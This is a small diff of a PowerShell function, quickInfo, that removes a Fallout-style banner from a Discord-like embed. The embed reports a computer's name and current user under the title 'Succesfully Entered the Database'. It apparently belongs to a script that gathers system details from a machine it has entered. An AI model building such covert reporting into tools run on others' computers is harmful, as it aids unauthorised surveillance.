@@ -208,9 +208,6 @@ Function quickInfo{
             @{
                 title       = "$env:COMPUTERNAME | :pipboy: Succesfully Entered the Database :pipboy: "
                 "description" = @"
-`````ROBCO INDUSTRIES UNIFIED OPERATING SYSTEM``````
-```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
-
 ``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
 :Hola: **User Information** :Hola:
 - **Current User**          : ``$env:USERNAME``
